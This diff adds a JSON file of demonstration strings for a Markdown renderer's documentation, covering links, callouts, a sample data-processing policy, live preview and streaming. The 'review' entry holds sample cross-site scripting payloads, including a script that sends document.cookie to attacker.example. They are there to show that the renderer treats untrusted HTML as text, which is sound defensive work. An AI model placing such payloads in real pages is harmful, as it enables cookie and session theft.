@@ -1,0 +1,40 @@
+{
+  "about": "A Markdown document rendered with the library's own components: headings, lists, tables, code, quotations, callouts and footnotes. No string of HTML is ever rendered.",
+  "links": {
+    "about": "`components.link` replaces the library's link: a link that leaves the site opens in a new tab with `rel=\"noopener noreferrer\"`, and a link to a heading opens in the same tab.",
+    "source": "# Settlement\n\nPayouts settle on the next business day. A payout above the [reserve threshold](#reserves) waits for review.\n\n## Reserves\n\nThe reserve is 5% of the rolling 90-day volume. The [card network rules](https://example.com/rules) set the floor.\n",
+    "title": "Links that leave the site"
+  },
+  "notes": {
+    "source": "# Retry budget\n\nMoved the retry budget from **3** to **5** attempts in `queue.ts`.\n\n> [!NOTE]\n> The backoff doubles each attempt, so the fifth waits 8 seconds.\n\n- [x] Load test on staging\n- [ ] Watch p99 for a day\n"
+  },
+  "policy": {
+    "about": "Headings at the page's level, a table named by its section, task items with lucide marks, a callout, a fence with a title and a copy control, a quotation and a footnote. `headingLevel={3}` starts the document below the scene's own heading.",
+    "copied": "Copied the command",
+    "copy": "Copy the command",
+    "source": "# Data processing policy\n\nEffective **1 October 2026**. Applies to every workspace on the *Team* and *Enterprise* plans.[^officer]\n\n## Subprocessors\n\n| Subprocessor | Purpose | Days kept |\n| :--- | :--- | ---: |\n| Aurora Mail | Transactional email | 30 |\n| Northwind Storage | Document storage | 365 |\n\n## Obligations\n\n- [x] Record of processing activities reviewed\n- [ ] Annual subprocessor audit signed off\n- [ ] Retention job run for closed accounts\n\n> [!WARNING]\n> Erasure requests are answered within 30 days. Start the export first.\n\n```sh title=\"export.sh\"\ncurl -X POST https://api.example.com/v1/exports\n```\n\n> Personal data never leaves the EU. The full text is in [the processing agreement](https://example.com/dpa).\n\n[^officer]: Set by the data protection officer on 12 September 2026.\n",
+    "title": "A document"
+  },
+  "preview": {
+    "about": "The document renders again on every keystroke, so a preview beside a field is the field's value passed as `source`.",
+    "label": "Markdown",
+    "source": "## Release 4.2\n\n- **Faster** exports\n- Fixed the `timeout` on uploads\n\nType here to change the preview.\n",
+    "title": "Live preview"
+  },
+  "review": {
+    "about": "A customer review pasted straight into the renderer. The script, the image with a handler and the `javascript:` link render as text: raw HTML is never parsed, and the parser drops an executable destination and keeps the link's words.",
+    "source": "**Verified purchase**, Priya Nair, 12 July 2026\n\nThe espresso machine arrived two days early, and the grinder is quieter than the old one.\n\n<script>fetch('https://attacker.example/c?v=' + document.cookie)</script>\n\n<img src=\"broken.png\" onerror=\"alert(1)\">\n\n[Claim your discount](javascript:alert(document.cookie))\n\nOne star off: the water tank is awkward to refill.\n",
+    "title": "Untrusted text"
+  },
+  "size": {
+    "about": "`sm` for a comment or a chat message, `md` for a page. The body text, the gaps and every component inside follow the size.",
+    "title": "Sizes"
+  },
+  "streaming": {
+    "about": "`streaming` closes a fence the stream has not closed yet, so the code shows as code while it arrives. Replay the answer to watch it stream in, 24 characters at a time.",
+    "replay": "Stream the answer again",
+    "source": "To rotate the key, run the script and restart the workers:\n\n```sh\n./rotate-key.sh --env production\npnpm workers restart\n```\n\nThe old key keeps working for **24 hours**.\n",
+    "title": "Streaming text"
+  },
+  "title": "Markdown"
+}
